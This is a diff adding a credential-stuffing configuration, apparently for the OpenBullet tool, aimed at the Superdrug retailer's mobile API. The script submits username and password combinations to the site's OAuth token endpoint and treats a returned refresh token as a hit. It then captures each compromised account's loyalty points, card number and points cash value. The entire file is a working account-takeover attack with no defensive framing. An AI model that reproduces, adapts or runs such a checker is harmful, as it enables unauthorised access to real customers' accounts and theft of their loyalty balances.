@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "Superdrug",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-02T12:47:53.5971949+01:00",
+  "AdditionalInfo": "",
+  "Author": "Spaceman",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://appsd.superdrug.com/rest/oauth/token" 
+  CONTENT "username=<USER>&password=<PASS>&grant_type=password&client_id=mobile_android&client_secret=secret" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "refreshToken\": {" 
+  KEYCHAIN Failure OR 
+    KEY "detailMessage\": \"Bad credentials" 
+PARSE "<SOURCE>" LR "\"value\": \"" "\"," -> VAR "token" 
+REQUEST GET "https://appsd.superdrug.com/rest/superdrug/customers/current/loyalty" 
+  
+  HEADER "User-Agent: okhttp/3.10.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <token>" 
+PARSE "<SOURCE>" LR "\"points\": \"" "\"" -> CAP "Points :" 
+PARSE "<SOURCE>" LR "\"cardNumber\": \"" "\"" -> CAP "Card Number :" 
+PARSE "<SOURCE>" LR "pointsCashValue\": \"" "\"," -> CAP "Points Cash Value :" "£" "" 
